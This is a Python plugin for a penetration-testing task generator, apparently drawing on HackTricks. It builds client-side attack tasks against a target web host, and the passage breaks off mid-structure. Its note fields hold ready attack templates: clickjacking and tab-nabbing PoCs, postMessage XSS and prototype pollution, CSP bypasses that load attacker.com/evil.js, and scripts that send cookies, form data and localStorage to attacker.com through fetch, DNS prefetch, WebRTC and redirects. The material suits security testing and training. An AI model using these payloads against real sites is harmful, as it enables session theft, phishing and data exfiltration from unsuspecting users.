"""
Client-Side Security Attacks plugin

Generates tasks for client-side attack vectors including:
- Clickjacking (basic, multistep, drag&drop, double-clickjacking)
- Iframe traps (XSS persistence)
- Reverse tab nabbing (window.opener abuse)
- PostMessage vulnerabilities (origin bypass, prototype pollution)
- CSP bypass techniques (comprehensive)
- DOM clobbering
- Client-side exfiltration methods

Extracted from HackTricks:
- clickjacking.md
- iframe-traps.md
- reverse-tab-nabbing.md
- postmessage-vulnerabilities/*.md
- content-security-policy-csp-bypass/*.md

Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class ClientSideAttacksPlugin(ServicePlugin):
    """Client-side security attacks enumeration plugin"""

    @property
    def name(self) -> str:
        return "client-side-attacks"

    @property
    def default_ports(self) -> List[int]:
        return [80, 443, 8080, 8443]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'ssl/http', 'http-alt']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect HTTP/HTTPS services for client-side testing"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Check service name
        if any(svc in service for svc in self.service_names):
            return True

        # Check common web ports
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate client-side attacks task tree"""
        protocol = 'https' if port in [443, 8443] or 'https' in service_info.get('service', '') else 'http'
        base_url = f'{protocol}://{target}:{port}'

        tasks = {
            'id': f'client-side-{port}',
            'name': f'Client-Side Security Testing (Port {port})',
            'type': 'parent',
            'children': []
        }

        # Section 1: Clickjacking Testing
        tasks['children'].append({
            'id': f'clickjacking-test-{port}',
            'name': 'Clickjacking Protection Testing',
            'type': 'parent',
            'children': [
                {
                    'id': f'xframe-check-{port}',
                    'name': 'Check X-Frame-Options Header',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -sI {base_url} | grep -i "x-frame-options\\|frame-ancestors"',
                        'description': 'Check for clickjacking protection headers',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'ENUM'],
                        'flag_explanations': {
                            '-s': 'Silent mode (no progress)',
                            '-I': 'Fetch headers only',
                            'grep -i': 'Case-insensitive search for frame headers'
                        },
                        'success_indicators': [
                            'No X-Frame-Options header found',
                            'No CSP frame-ancestors directive',
                            'SAMEORIGIN set but vulnerable to same-origin clickjacking'
                        ],
                        'failure_indicators': [
                            'X-Frame-Options: DENY (fully protected)',
                            'CSP frame-ancestors none (fully protected)'
                        ],
                        'next_steps': [
                            'If no header: Create clickjacking PoC',
                            'If SAMEORIGIN: Test same-origin bypass',
                            'Check if forms can be prepopulated via GET params',
                            'Test iframe sandbox attribute bypass'
                        ],
                        'alternatives': [
                            f'Manual: Visit {base_url} in browser DevTools Network tab',
                            f'Burp: Intercept request to {base_url} and check response headers',
                            f'Browser: Try loading in iframe: <iframe src="{base_url}"></iframe>'
                        ],
                        'notes': 'X-Frame-Options: DENY prevents all framing. SAMEORIGIN allows same-origin framing. CSP frame-ancestors is modern alternative.'
                    }
                },
                {
                    'id': f'clickjacking-poc-{port}',
                    'name': 'Create Basic Clickjacking PoC',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create HTML PoC to test clickjacking vulnerability',
                        'alternatives': [
                            'Create clickjacking.html with opacity 0.1 iframe',
                            'Position target element over "Click me" div',
                            'Test form prepopulation via GET params',
                            'Create multistep clickjacking for multi-click actions'
                        ],
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'notes': '''Basic PoC template:
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.1;  /* Set to 0.0001 for real attack */
       z-index: 2;
   }
   div {
       position:absolute;
       top:470px;    /* Adjust to align with target button */
       left:60px;    /* Adjust to align with target button */
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="TARGET_URL"></iframe>

For form prepopulation: <iframe src="TARGET?email=attacker@evil.com">
For multistep: Add multiple divs with different positions
For drag&drop: Use draggable div with ondragstart event'''
                    }
                },
                {
                    'id': f'doubleclickjacking-{port}',
                    'name': 'Test DoubleClickjacking',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit timing difference between mousedown and onclick to bypass clickjacking protections',
                        'tags': ['OSCP:MEDIUM', 'ADVANCED'],
                        'alternatives': [
                            'Ask victim to double-click custom button',
                            'Load victim page during double-click timing',
                            'Victim clicks legit button in victim page (1 click bypass)',
                            'Target OAuth prompts or single-click sensitive actions'
                        ],
                        'next_steps': [
                            'Find sensitive 1-click actions (OAuth approve, delete, transfer)',
                            'Create PoC using mousedown/onclick timing',
                            'Test with opacity 0.0001 for stealth',
                            'Target mobile browsers (less protection)'
                        ],
                        'notes': 'DoubleClickjacking bypasses ALL clickjacking protections by exploiting browser timing. Victim only needs to double-click once. Very effective for OAuth prompts. Reference: https://www.youtube.com/watch?v=4rGvRRMrD18'
                    }
                },
                {
                    'id': f'sandbox-bypass-{port}',
                    'name': 'Test Iframe Sandbox Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass frame-busting scripts using iframe sandbox attribute',
                        'tags': ['OSCP:MEDIUM', 'BYPASS'],
                        'alternatives': [
                            'Use sandbox="allow-forms allow-scripts" (blocks top-level navigation)',
                            'Add allow-same-origin and allow-modals if needed',
                            'Test without allow-top-navigation to neutralize frame busters',
                            'Monitor browser console for required permissions'
                        ],
                        'notes': '''Sandbox bypass template:
<iframe
  id="victim_website"
  src="TARGET_URL"
  sandbox="allow-forms allow-scripts allow-same-origin allow-modals">
</iframe>

The allow-forms and allow-scripts enable actions while disabling top-level navigation, preventing iframe from verifying it is top window.'''
                    }
                }
            ]
        })

        # Section 2: Reverse Tab Nabbing
        tasks['children'].append({
            'id': f'tabnabbing-test-{port}',
            'name': 'Reverse Tab Nabbing Testing',
            'type': 'parent',
            'children': [
                {
                    'id': f'opener-check-{port}',
                    'name': 'Check for Vulnerable target="_blank" Links',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s {base_url} | grep -oP \'target="_blank".*?>\' | grep -v \'rel="noopener"\'',
                        'description': 'Find links with target="_blank" without rel="noopener"',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                        'flag_explanations': {
                            '-s': 'Silent mode',
                            'grep -oP': 'Perl regex with only matching output',
                            'grep -v': 'Invert match (exclude lines with noopener)'
                        },
                        'success_indicators': [
                            'Links with target="_blank" found',
                            'No rel="noopener" or rel="noreferrer"',
                            'Links to attacker-controllable URLs'
                        ],
                        'failure_indicators': [
                            'All links have rel="noopener noreferrer"',
                            'No target="_blank" links found',
                            'CSP prevents window.opener access'
                        ],
                        'next_steps': [
                            'Create malicious page to abuse window.opener',
                            'Change parent location to phishing page',
                            'Test window.opener access to parent DOM',
                            'Check if attacker can control link href'
                        ],
                        'alternatives': [
                            f'Manual: View page source of {base_url}',
                            'Browser DevTools: Search for target="_blank"',
                            'Burp: Spider site and search responses',
                            f'wget {base_url} -O- | grep target="_blank"'
                        ],
                        'notes': 'rel="opener" or missing rel="noopener" on target="_blank" allows window.opener access. Attacker can change parent page location to phishing site.'
                    }
                },
                {
                    'id': f'tabnabbing-poc-{port}',
                    'name': 'Create Reverse Tab Nabbing PoC',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create PoC to demonstrate window.opener abuse',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'alternatives': [
                            'Create malicious.html with window.opener.location redirect',
                            'Host on attacker server',
                            'Make victim click link to malicious.html',
                            'Parent tab redirects to phishing page'
                        ],
                        'notes': '''PoC template (malicious.html):
<!DOCTYPE html>
<html>
 <body>
  <script>
   if (window.opener) {
     window.opener.location = "https://attacker.com/phishing.html";
   }
  </script>
  <h1>Loading...</h1>
 </body>
</html>

Vulnerable page template:
<a href="http://attacker.com/malicious.html" target="_blank" rel="opener">
  Click me
</a>

Same-origin attack allows full window.opener DOM access.
Cross-origin only allows limited properties: closed, frames, length, opener, parent, self, top'''
                    }
                }
            ]
        })

        # Section 3: PostMessage Vulnerabilities
        tasks['children'].append({
            'id': f'postmessage-test-{port}',
            'name': 'PostMessage Vulnerability Testing',
            'type': 'parent',
            'children': [
                {
                    'id': f'postmessage-enum-{port}',
                    'name': 'Enumerate PostMessage Listeners',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Find addEventListener("message") in JavaScript code',
                        'tags': ['OSCP:HIGH', 'ENUM', 'MANUAL'],
                        'alternatives': [
                            f'Browser DevTools Console: getEventListeners(window)',
                            f'Search JS source: window.addEventListener("message"',
                            f'Search jQuery: $(window).on("message"',
                            'Use extension: posta (https://github.com/benso-io/posta)',
                            'Use extension: postMessage-tracker'
                        ],
                        'next_steps': [
                            'Check if origin is validated',
                            'Test origin bypass techniques',
                            'Check if event.source is validated',
                            'Test prototype pollution via postMessage data',
                            'Check for XSS via unsanitized message data'
                        ],
                        'notes': '''Event listener enumeration:
// DevTools Console
getEventListeners(window)

// Look for:
window.addEventListener("message", (event) => {
  if (event.origin !== "http://example.org") return;  // GOOD
  // Process event.data
});

// Vulnerable (no origin check):
window.addEventListener("message", (event) => {
  document.getElementById('output').innerHTML = event.data;  // XSS
});'''
                    }
                },
                {
                    'id': f'postmessage-origin-bypass-{port}',
                    'name': 'Test PostMessage Origin Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass origin validation in postMessage handlers',
                        'tags': ['OSCP:HIGH', 'BYPASS'],
                        'alternatives': [
                            'Test indexOf() bypass: "https://app.com".indexOf("https://app")',
                            'Test search() bypass: regex dot wildcard',
                            'Test match() bypass: improper regex',
                            'Test escapeHtml bypass: use Error object or File object',
                            'Test e.origin == window.origin: sandboxed iframe (both null)',
                            'Test startsWith/endsWith bypass'
                        ],
                        'notes': '''Common origin bypass techniques:

1. indexOf() bypass:
   if (event.origin.indexOf("https://example.com") != -1) // BAD
   // Bypass: https://example.com.attacker.com

2. search() regex bypass:
   if (event.origin.search("example.com") != -1) // BAD
   // Bypass: https://exampleXcom.attacker.com (dot is wildcard)

3. Null origin (sandboxed iframe):
   <iframe sandbox="allow-scripts allow-popups" src="TARGET"></iframe>
   // Both iframe and popup have origin = null
   // e.origin == window.origin → true

4. escapeHtml bypass (File object):
   result = escapeHtml(new File(["payload"], "file"));
   // File.name is read-only, not escaped

5. Wildcard targetOrigin:
   targetWindow.postMessage(data, '*');  // Sends to any origin
   // If page can be iframed, attacker changes iframe location to capture'''
                    }
                },
                {
                    'id': f'postmessage-xss-{port}',
                    'name': 'Test PostMessage to XSS',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit XSS via postMessage data injection',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'alternatives': [
                            'Send malicious data via iframe.contentWindow.postMessage()',
                            'Test prototype pollution: {"__proto__":{"isAdmin":true}}',
                            'Test DOM XSS via innerHTML injection',
                            'Combine with CSTI (client-side template injection)',
                            'Send XSS payload and trigger page refresh'
                        ],
                        'notes': '''PostMessage XSS PoC:

<iframe id="victim" src="http://TARGET"></iframe>
<script>
  setTimeout(() => {
    document.getElementById('victim').contentWindow.postMessage(
      '<img src=x onerror="alert(document.domain)">',
      '*'
    );
  }, 2000);
</script>

Prototype pollution + XSS:
<iframe id="victim" src="http://TARGET/vulnerable"></iframe>
<script>
  function exploit() {
    // Pollute prototype
    document.getElementById('victim').contentWindow.postMessage(
      '{"__proto__":{"isAdmin":true,"username":"<img src=x onerror=\\"alert(1)\\">"}}',
      '*'
    );

    // Trigger refresh to execute
    setTimeout(() => {
      document.getElementById('victim').contentWindow.postMessage(
        '{"action":"refresh"}',
        '*'
      );
    }, 1000);
  }

  setTimeout(exploit, 2000);
</script>

Reference: https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html'''
                    }
                },
                {
                    'id': f'postmessage-source-bypass-{port}',
                    'name': 'Bypass event.source Validation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass event.source validation using deleted iframe',
                        'tags': ['OSCP:MEDIUM', 'BYPASS'],
                        'alternatives': [
                            'Create iframe that sends postMessage',
                            'Immediately delete iframe after sending',
                            'event.source becomes null',
                            'Bypasses: if (event.source !== window) return;'
                        ],
                        'notes': '''Source validation bypass PoC:

<script>
  // Create iframe
  let iframe = document.createElement('iframe');
  iframe.src = 'about:blank';
  document.body.appendChild(iframe);

  // Send message
  iframe.contentWindow.postMessage('payload', '*');

  // Immediately delete iframe
  document.body.removeChild(iframe);

  // Now event.source is null
</script>

This bypasses checks like:
if (event.source !== window) return;  // Bypassed when source is null'''
                    }
                },
                {
                    'id': f'postmessage-wildcard-{port}',
                    'name': 'Exploit Wildcard targetOrigin',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Steal postMessage data sent with wildcard targetOrigin',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'alternatives': [
                            'Iframe target page (if no X-Frame-Options)',
                            'Change child iframe location to attacker domain',
                            'Capture message sent with targetOrigin="*"',
                            'Exfiltrate sensitive data'
                        ],
                        'notes': '''If page sends: childFrame.postMessage(data, '*')
And you can iframe the page and manipulate child iframe location:

<iframe id="parent" src="http://TARGET"></iframe>
<script>
  setInterval(() => {
    try {
      // Change child iframe to attacker domain
      window.frames[0].frames[0].location = "https://attacker.com/capture";
    } catch(e) {}
  }, 100);
</script>

On attacker.com/capture:
window.addEventListener("message", (e) => {
  // Capture sensitive message
  fetch("https://attacker.com/log?data=" + e.data);
});

Reference: https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/'''
                    }
                }
            ]
        })

        # Section 4: CSP Bypass Testing
        tasks['children'].append({
            'id': f'csp-test-{port}',
            'name': 'Content Security Policy Bypass',
            'type': 'parent',
            'children': [
                {
                    'id': f'csp-check-{port}',
                    'name': 'Analyze CSP Header',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -sI {base_url} | grep -i "content-security-policy"',
                        'description': 'Check Content-Security-Policy header configuration',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                        'flag_explanations': {
                            '-s': 'Silent mode',
                            '-I': 'Headers only',
                            'grep -i': 'Case-insensitive search for CSP header'
                        },
                        'success_indicators': [
                            'CSP header found',
                            'Unsafe directives: unsafe-inline, unsafe-eval',
                            'Wildcard sources: * or https:',
                            'Missing object-src or default-src',
                            'Third-party domains whitelisted'
                        ],
                        'failure_indicators': [
                            'No CSP header (no XSS protection)',
                            'Strict CSP with nonces/hashes only'
                        ],
                        'next_steps': [
                            'Test unsafe-inline with <script>alert(1)</script>',
                            'Test unsafe-eval with <script src="data:..."></script>',
                            'Check whitelisted domains for JSONP endpoints',
                            'Test base-uri missing (dangling markup)',
                            'Test file upload + self bypass'
                        ],
                        'alternatives': [
                            f'Manual: Check response headers in browser DevTools',
                            f'Burp: Intercept {base_url} and view headers',
                            'Online tools: https://csp-evaluator.withgoogle.com/',
                            'csp.py: python3 csp.py -u TARGET_URL'
                        ],
                        'notes': 'CSP prevents XSS by restricting script sources. Unsafe directives, wildcards, and missing directives create bypass opportunities.'
                    }
                },
                {
                    'id': f'csp-unsafe-inline-{port}',
                    'name': 'Test CSP unsafe-inline Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass CSP with unsafe-inline directive',
                        'tags': ['OSCP:HIGH', 'BYPASS'],
                        'alternatives': [
                            'Direct inline script: <script>alert(1)</script>',
                            'Inline event handler: <img src=x onerror=alert(1)>',
                            'If self + unsafe-inline: use iframe srcdoc with inline script',
                            'Inline style for exfiltration'
                        ],
                        'notes': '''CSP: script-src 'self' 'unsafe-inline';

Payload: <script>alert(document.domain)</script>

Self + unsafe-inline bypass via iframe:
<iframe srcdoc="<script>alert(parent.document.domain)</script>"></iframe>

This works because srcdoc creates inline document considered 'self'.'''
                    }
                },
                {
                    'id': f'csp-jsonp-{port}',
                    'name': 'Test JSONP Endpoint Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit whitelisted domains with JSONP endpoints',
                        'tags': ['OSCP:HIGH', 'BYPASS'],
                        'alternatives': [
                            'Google: https://www.google.com/complete/search?client=chrome&q=x&callback=alert',
                            'YouTube: https://www.youtube.com/oembed?callback=alert',
                            'Check JSONBee for JSONP endpoints: https://github.com/zigoo0/JSONBee',
                            'Test allowed domains for ?callback= parameter',
                            'Bypass with open redirect on allowed domain'
                        ],
                        'notes': '''If CSP allows google.com or youtube.com:

Google JSONP bypass:
<script src="https://www.google.com/complete/search?client=chrome&q=x&callback=alert#1"></script>

YouTube JSONP bypass:
<script src="https://www.youtube.com/oembed?callback=alert;"></script>

Custom callback:
<script src="https://allowed-site.com/api?callback=fetch('/admin').then(r=>r.text()).then(t=>location='//attacker.com?'+btoa(t))"></script>

Check JSONBee for more endpoints.'''
                    }
                },
                {
                    'id': f'csp-angular-{port}',
                    'name': 'Test AngularJS CSP Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit Angular + whitelisted CDN for CSP bypass',
                        'tags': ['OSCP:HIGH', 'BYPASS'],
                        'alternatives': [
                            'Load vulnerable Angular version from cdnjs.cloudflare.com',
                            'Use ng-app and template expression: {{constructor.constructor("alert(1)")()}}',
                            'Abuse Google reCAPTCHA JS for bypass',
                            'Use Prototype.js + Angular for window access'
                        ],
                        'notes': '''If CSP allows cdnjs.cloudflare.com:

<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

Or with Prototype.js:
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"></script>
<div ng-app ng-csp>
  {{$on.curry.call().alert(document.domain)}}
</div>

Google reCAPTCHA bypass:
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)" />

Reference: https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/'''
                    }
                },
                {
                    'id': f'csp-base-uri-{port}',
                    'name': 'Test Missing base-uri Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit missing base-uri to hijack relative script loads',
                        'tags': ['OSCP:MEDIUM', 'BYPASS'],
                        'alternatives': [
                            'Inject <base href="https://attacker.com/">',
                            'Hijack relative script loads: <script src="/js/app.js">',
                            'Works if script uses nonce (bypass nonce requirement)',
                            'Use HTTPS base if page is HTTPS'
                        ],
                        'notes': '''If CSP missing base-uri and page loads:
<script src="/js/app.js" nonce="abc123"></script>

Inject:
<base href="https://attacker.com/">

Browser loads: https://attacker.com/js/app.js
Bypasses nonce requirement because base tag changes origin.

Also enables dangling markup injection.'''
                    }
                },
                {
                    'id': f'csp-upload-{port}',
                    'name': 'Test File Upload + self Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass CSP self restriction via file upload',
                        'tags': ['OSCP:HIGH', 'BYPASS'],
                        'alternatives': [
                            'Upload JS file disguised as image',
                            'Find misinterpreted extensions (.wave, custom)',
                            'Create polyglot (valid image + JS code)',
                            'Reference uploaded file: <script src="/uploads/file.png.js">',
                            'Bypass MIME type checks'
                        ],
                        'notes': '''CSP: script-src 'self';

If you can upload files:
1. Find extension server doesn't recognize (.wave, .custom)
2. Upload JS code with that extension
3. Server won't set MIME type (not rejected as non-script)
4. Inject: <script src="/uploads/payload.wave"></script>

Or create polyglot:
- Valid PNG + JS code
- Upload as image.png
- If server allows .png.js, rename
- Inject: <script src="/uploads/image.png.js"></script>

Polyglot database: https://github.com/Polydet/polyglot-database'''
                    }
                },
                {
                    'id': f'csp-redirect-{port}',
                    'name': 'Test CSP Path Bypass via Redirect',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass CSP path restrictions using server-side redirects',
                        'tags': ['OSCP:MEDIUM', 'BYPASS'],
                        'alternatives': [
                            'Find open redirect on allowed domain',
                            'CSP checks path before redirect, not after',
                            'Redirect to JSONP or malicious JS',
                            'Example: https://allowed.com/path → redirect → https://evil.com/xss.js'
                        ],
                        'notes': '''CSP: script-src https://google.com/allowed/path;

If you find redirect endpoint:
<script src="https://google.com/allowed/path/redirect?url=https://evil.com/xss.js"></script>

CSP allows the initial URL (matches path).
Server redirects to different domain.
Browser follows redirect (path not checked after redirect).

Even full path can be bypassed:
CSP: script-src https://google.com/a/b/c/d;

With redirect:
<script src="https://google.com/a/b/c/d?redirect=https://evil.com/"></script>'''
                    }
                },
                {
                    'id': f'csp-strict-dynamic-{port}',
                    'name': 'Test strict-dynamic Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Abuse strict-dynamic to load additional scripts',
                        'tags': ['OSCP:MEDIUM', 'BYPASS'],
                        'alternatives': [
                            'Find allowed script that creates new script tags',
                            'New scripts inherit trust from parent (strict-dynamic)',
                            'Inject script creation in allowed code',
                            'DOM manipulation to create malicious scripts'
                        ],
                        'notes': '''CSP with strict-dynamic:
script-src 'nonce-abc123' 'strict-dynamic';

If allowed script contains:
let s = document.createElement('script');
s.src = USER_INPUT;  // Controlled by attacker
document.body.appendChild(s);

Attacker can load arbitrary scripts because:
- Parent script was allowed (has nonce)
- strict-dynamic trusts scripts created by allowed scripts
- No nonce needed for dynamically created scripts

Exploit: Inject URL to malicious script in USER_INPUT.'''
                    }
                },
                {
                    'id': f'csp-nonce-reuse-{port}',
                    'name': 'Test Nonce Reuse',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Reuse nonce from page to load malicious script',
                        'tags': ['OSCP:MEDIUM', 'BYPASS'],
                        'alternatives': [
                            'Find nonce in page: doc.querySelector("[nonce]").nonce',
                            'Create new script tag with same nonce',
                            'Load malicious script from attacker domain',
                            'Works with strict-dynamic'
                        ],
                        'notes': '''If you have limited JS execution:

// Extract nonce
let nonce = document.querySelector("[nonce]").nonce;

// Create malicious script
let s = document.createElement("script");
s.src = "https://attacker.com/evil.js";
s.nonce = nonce;
document.body.appendChild(s);

Template injection example:
<img src="x" ng-on-error='
  doc=$event.target.ownerDocument;
  a=doc.querySelector("[nonce]");
  b=doc.createElement("script");
  b.src="//attacker.com/evil.js";
  b.nonce=a.nonce;
  doc.body.appendChild(b)' />

With strict-dynamic, any allowed source can load new sources.'''
                    }
                },
                {
                    'id': f'csp-exfil-{port}',
                    'name': 'Test CSP Exfiltration Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exfiltrate data despite strict CSP using DNS/WebRTC/meta',
                        'tags': ['OSCP:HIGH', 'EXFIL'],
                        'alternatives': [
                            'DNS prefetch: <link rel="dns-prefetch" href="//DATA.attacker.com">',
                            'WebRTC: RTCPeerConnection with STUN server leak',
                            'Meta refresh: <meta http-equiv="refresh" content="0;url=//attacker.com?data">',
                            'Location: window.location = "https://attacker.com?" + data',
                            'CredentialsContainer: navigator.credentials.store() with iconURL'
                        ],
                        'notes': '''DNS Prefetch exfiltration:
<script>
  let secret = document.cookie.split("=")[1];
  let link = document.createElement("link");
  link.rel = "dns-prefetch";
  link.href = "//" + secret + ".attacker.com";
  document.head.appendChild(link);
</script>

WebRTC exfiltration:
<script>
(async () => {
  p = new RTCPeerConnection({
    iceServers: [{urls: "stun:SECRET.attacker.com"}]
  });
  p.createDataChannel("");
  p.setLocalDescription(await p.createOffer());
})();
</script>

Location exfiltration:
<script>
  window.location = "https://attacker.com?" + document.cookie;
</script>

Note: DNS prefetch doesn't work in headless browsers (bots).
Prevention: X-DNS-Prefetch-Control: off'''
                    }
                }
            ]
        })

        # Section 5: Iframe Traps
        tasks['children'].append({
            'id': f'iframe-traps-{port}',
            'name': 'Iframe Traps (XSS Persistence)',
            'type': 'parent',
            'children': [
                {
                    'id': f'iframe-trap-poc-{port}',
                    'name': 'Create Iframe Trap PoC',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Trap victim in iframe to persist XSS and monitor navigation',
                        'tags': ['OSCP:MEDIUM', 'ADVANCED'],
                        'alternatives': [
                            'Load victim page in fullscreen iframe (opacity 1)',
                            'Capture all navigation within iframe',
                            'Update browser URL bar to match iframe location',
                            'Steal form data before submission',
                            'Exfiltrate localStorage/sessionStorage'
                        ],
                        'notes': '''Iframe trap concept:
1. XSS creates fullscreen iframe loading victim site
2. Victim navigates WITHIN iframe (doesn't notice)
3. Attacker JS monitors iframe and steals data
4. URL bar updated to match iframe (appears normal)

PoC structure:
<iframe id="trap" src="TARGET" style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;"></iframe>

<script>
  // Monitor iframe location changes
  let iframe = document.getElementById('trap');

  setInterval(() => {
    try {
      // Update browser URL to match iframe
      history.replaceState(null, '', iframe.contentWindow.location.href);

      // Steal form data
      let forms = iframe.contentDocument.querySelectorAll('form');
      forms.forEach(form => {
        form.addEventListener('submit', (e) => {
          let data = new FormData(form);
          fetch('https://attacker.com/steal', {
            method: 'POST',
            body: data
          });
        });
      });

      // Steal localStorage
      let storage = iframe.contentWindow.localStorage;
      fetch('https://attacker.com/steal?storage=' + JSON.stringify(storage));

    } catch(e) {
      // Cross-origin, can't access
    }
  }, 100);

  // Disable right-click to prevent "reload"
  iframe.contentDocument.addEventListener('contextmenu', (e) => {
    e.preventDefault();
  });
</script>

Limitations:
- Victim closing tab escapes
- Victim typing new URL escapes
- Page refresh can escape (unless URL updated)

Advanced: Monitor mouse leaving iframe → update URL to XSS endpoint
So reload re-triggers trap.

Reference: https://trustedsec.com/blog/persisting-xss-with-iframe-traps'''
                    }
                }
            ]
        })

        # Section 6: DOM Clobbering
        tasks['children'].append({
            'id': f'dom-clobber-{port}',
            'name': 'DOM Clobbering Testing',
            'type': 'parent',
            'children': [
                {
                    'id': f'dom-clobber-test-{port}',
                    'name': 'Test DOM Clobbering Vulnerabilities',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Override global variables using HTML id/name attributes',
                        'tags': ['OSCP:MEDIUM', 'ADVANCED'],
                        'alternatives': [
                            'Test: <a id="config"></a> to override window.config',
                            'Use name attribute: <form name="isAdmin"></form>',
                            'Override nested properties: <a id="config"><a id="config" name="apiEndpoint" href="evil.com">',
                            'Bypass sanitizers that allow id/name attributes',
                            'Combine with CSP bypass or XSS'
                        ],
                        'notes': '''DOM clobbering allows overriding globals via HTML:

Vulnerable JS:
if (window.config.isAdmin) {
  // Admin actions
}

Attack:
<form id="config">
  <input name="isAdmin" value="true">
</form>

Now window.config.isAdmin == "true" (truthy)

Nested properties:
<a id="config">
  <a id="config" name="apiEndpoint" href="https://evil.com/api">
</a>

Now window.config.apiEndpoint.href == "https://evil.com/api"

Common targets:
- Configuration objects: window.config
- Feature flags: window.features
- API endpoints: window.api
- Security checks: window.csrf

Bypass CSP by overriding script source:
<a id="scripts" href="https://evil.com/xss.js"></a>

If code does:
let src = window.scripts.href;  // Now evil.com
document.write('<script src="' + src + '">');

Reference: https://domclob.xyz/'''
                    }
                }
            ]
        })

        # Section 7: Research & Documentation
        tasks['children'].append({
            'id': f'client-side-research-{port}',
            'name': 'Client-Side Attack Research',
            'type': 'parent',
            'children': [
                {
                    'id': f'csp-tools-{port}',
                    'name': 'Use CSP Analysis Tools',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Analyze CSP with automated tools',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'AUTOMATED'],
                        'alternatives': [
                            'Google CSP Evaluator: https://csp-evaluator.withgoogle.com/',
                            'CSP Validator: https://cspvalidator.org/',
                            'Browser extension: CSP Auditor',
                            'Burp extension: CSP Auditor',
                            'Manual review of CSP directives'
                        ],
                        'notes': '''CSP analysis tools:

1. Google CSP Evaluator (best):
   - Paste CSP header
   - Automatic weakness detection
   - Bypass suggestions
   - URL: https://csp-evaluator.withgoogle.com/

2. CSP Validator:
   - URL testing
   - Header analysis
   - URL: https://cspvalidator.org/

3. Manual CSP review checklist:
   - unsafe-inline allowed?
   - unsafe-eval allowed?
   - Wildcards (* or https:)?
   - Third-party domains (CDNs, analytics)?
   - Missing directives (base-uri, form-action)?
   - object-src restrictions?
   - Nonce/hash implementation?

4. CSP header extraction:
   curl -sI URL | grep -i content-security-policy'''
                    }
                },
                {
                    'id': f'postmessage-tools-{port}',
                    'name': 'Use PostMessage Monitoring Tools',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Monitor and intercept postMessage communications',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED'],
                        'alternatives': [
                            'Posta extension: https://github.com/benso-io/posta',
                            'postMessage-tracker: https://github.com/fransr/postMessage-tracker',
                            'DevTools Console: getEventListeners(window)',
                            'Search JS source code for addEventListener',
                            'Practice: https://github.com/yavolo/eventlistener-xss-recon'
                        ],
                        'notes': '''PostMessage monitoring workflow:

1. Install Posta browser extension
2. Navigate to target site
3. Posta intercepts all postMessage calls
4. Review:
   - Message data
   - Origin validation
   - targetOrigin setting (* = vulnerable)
   - Event handler code

5. Test origin bypasses:
   - Create test iframe
   - Send crafted messages
   - Check if accepted

6. Code review for:
   window.addEventListener("message", ...)
   $(window).on("message", ...)

7. Check validation:
   if (event.origin !== "expected") return;  // GOOD
   if (!event.origin) return;  // BAD (null bypass)
   if (event.origin.includes("site")) ...  // BAD (substring)'''
                    }
                },
                {
                    'id': f'clickjacking-tools-{port}',
                    'name': 'Use Clickjacking Testing Tools',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Automated clickjacking vulnerability detection',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED'],
                        'alternatives': [
                            'Burp Clickbandit (generate PoC)',
                            'OWASP ZAP clickjacking scanner',
                            'Manual: curl -sI URL | grep -i x-frame-options',
                            'Browser: Try loading in iframe',
                            'PortSwigger clickjacking labs for practice'
                        ],
